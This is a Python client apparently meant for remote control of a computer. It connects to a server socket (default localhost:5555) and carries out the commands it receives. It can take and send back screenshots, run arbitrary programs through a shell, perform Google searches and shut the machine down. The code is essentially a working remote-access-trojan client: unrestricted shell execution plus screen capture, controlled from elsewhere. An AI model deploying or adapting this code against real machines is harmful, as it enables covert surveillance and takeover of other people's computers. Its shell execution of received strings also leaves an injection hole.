import socket
import pyautogui
import io
from googlesearch import search
import subprocess
import os
import platform

def google_search(query):
    try:
        results = []
        for result in search(query, num_results=5):  # İlk 5 sonucu al
            results.append(result)
        return "\n".join(results)
    except Exception as e:
        return f"Error: {e}"

def run_program(program_name):
    try:
        subprocess.Popen(program_name, shell=True)
        return f"Program '{program_name}' is running."
    except Exception as e:
        return f"Error: {e}"

def shutdown_machine():
    if platform.system() == "Windows":
        os.system("shutdown /s /t 1")
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        os.system("shutdown now")

def connect_to_server(host='127.0.0.1', port=5555):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    print("Connected to the server.")

    try:
        while True:
            command = client.recv(1024).decode().strip().lower()

            if command == 'exit':
                print("Server requested to close connection.")
                break

            elif command.startswith('search:'):
                query = command.split(":", 1)[1].strip()
                print(f"Performing Google search for: {query}")
                results = google_search(query)
                client.send(results.encode())

            elif command == 'screenshot':
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                screenshot_data = buffer.getvalue()

                size = len(screenshot_data)
                client.send(f"{size:<10}".encode())
                client.send(screenshot_data)
                print("Screenshot sent.")

            elif command.startswith('run:'):
                program_name = command.split(":", 1)[1].strip()
                print(f"Running program: {program_name}")
                response = run_program(program_name)
                client.send(response.encode())

            elif command == 'shutdown':
                print("Shutdown command received. Shutting down...")
                shutdown_machine()
                break

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

if __name__ == '__main__':
    connect_to_server()
